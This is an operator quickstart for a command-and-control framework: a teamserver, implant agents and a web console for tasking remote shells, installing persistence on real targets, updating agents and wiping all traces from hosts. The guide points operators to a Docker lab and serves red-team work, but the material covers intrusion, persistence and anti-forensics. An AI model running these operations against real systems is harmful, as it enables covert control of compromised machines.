# Operator quickstart

## Prerequisites

- Go toolchain
- PostgreSQL 16 (Compose service `postgres` is fine)
- Built or `go run` access to `teamserver`, `agent`, and `client`

## Start the stack

1. Start the database:

```text
docker compose -f packager/docker/docker-compose.yml up -d postgres
```

2. Start the teamserver (operator API on `:8080`, HTTPS agent channel on `:8443`):

```text
go run ./server/cmd/teamserver
```

Lab TLS certs are created under `data/certs/` on first start.

3. Start a **lab agent in Docker** (recommended — do not run implants on the command-center host):

```text
docker compose -f packager/docker/docker-compose.lab.yml up -d --build
```

The command-center machine is refused as a session by default (`LATTICE_ALLOW_LOCAL_AGENTS=false`). Lab persistence is the Compose `restart: unless-stopped` policy (see [persistence.md](persistence.md) for Keel/Harbor/Splice on real targets).

4. List sessions and task:

```text
go run ./client/cmd/client sessions
go run ./client/cmd/client task <agent_id> whoami
go run ./client/cmd/client task <agent_id> echo hello
```

Builtins: `whoami`, `echo`, `hostname`.

Shell tasking (60s timeout):

```text
go run ./client/cmd/client task <agent_id> dir
go run ./client/cmd/client task <agent_id> shell "ipconfig /all"
go run ./client/cmd/client task <agent_id> powershell "Get-Process | Select -First 5"
go run ./client/cmd/client task <agent_id> ls -la
```

On Windows, the console sends each line to `cmd.exe` by default. Prefix with `powershell` / `pwsh` to run PowerShell (Windows agents only). On Unix, lines run under `$SHELL` (fallback `/bin/sh`); `bash` / `sh` prefixes select those shells. PowerShell prefixes are rejected on non-Windows agents.

`client task` prints the task id, then waits until the agent finishes (status lines, then stdout/stderr).

## Web UI

With the teamserver running:

```text
cd client/ui/web
npm install
npm run dev
```

Open http://127.0.0.1:5173. Vite proxies Connect calls to the teamserver on `:8080`.

The UI uses a Secret-style shell: title bar, icon sidebar, sessions list, full-page console, and a listeners status view. The **Documentation** sidebar item (book icon, above Settings) renders these operator guides and the developer getting-started doc in-app; switch sets with Operators / Developers.

Open a session in **Console**, then type native OS commands and press Enter. The console is a terminal emulator (no artificial helpers): every line goes to the agent’s native shell. Working directory starts at `C:\` (Windows) or `/` (Unix); `cd` / `pwd` persist across commands. Examples: `dir`, `ls -la`, `cd Windows`, `powershell Get-Date` (Windows only).

Use **+** for another terminal tab, the split icons (or right-click a pane → Split right / Split down) for side-by-side or stacked panes, and **×** to close a tab or pane. The browser inspect menu is disabled in the console. ↑/↓ history, Ctrl+L clears scrollback, **Ctrl+C** cancels a queued or running command. The input line has shell syntax highlighting.

Persistence method codenames (**Keel**, **Harbor**, **Splice**) and full wipe (**Ash**) are documented in [persistence.md](persistence.md). Bring-your-own elevation modules are documented in [elevate.md](elevate.md).

### Lab vs target persistence

The **command-center host is never a session**. Check-ins whose hostname matches the teamserver are rejected (`LATTICE_ALLOW_LOCAL_AGENTS=false` by default), and leftover matching rows are purged on teamserver start.

- **Lab:** keep the Docker lab agent up with `docker compose -f packager/docker/docker-compose.lab.yml up -d` (`restart: unless-stopped`).
- **Real targets:** from a live remote session run `persist`, or run `agent install` on that target only. Methods are **Keel** / **Harbor** / **Splice** (see [persistence.md](persistence.md)).

Remove persistence registration on a target:

```text
.\bin\agent.exe uninstall
```

### Remove all traces from a target

From an elevated shell on the **target** (never the command center):

```text
.\bin\agent.exe cleanup
```

Or task the agent: `cleanup` (also `uninstall-all` / `burn`). This stops/removes the service, deletes the install dir and config/`agent.id`, schedules deletion of the running binary, then exits.

Service name / paths are overridable with `LATTICE_SERVICE_NAME`, `LATTICE_INSTALL_DIR`, and `LATTICE_CONFIG_DIR` for less obvious lab/opsec footprints.

### Agent updates

Publish a new agent build to the teamserver catalog:

```text
go build -o bin/agent.exe ./agent/cmd/agent
go run ./server/cmd/publish-agent -version 0.2.0 -file ./bin/agent.exe -os windows -arch amd64
```

Then task live agents:

```text
update
```

The agent checks `/v1/update/check`, downloads `/v1/update/download`, verifies SHA-256, replaces its binary, and restarts. Check-ins also advertise when a newer build is available.

**Settings** (gear in the sidebar) → **Terminal** controls full vs partial path in the prompt.

Agent output is capped at 256KiB.

The agent process must be running while you task. If the console stays on a queued status, start:

```text
go run ./agent/cmd/agent -server https://127.0.0.1:8443
```
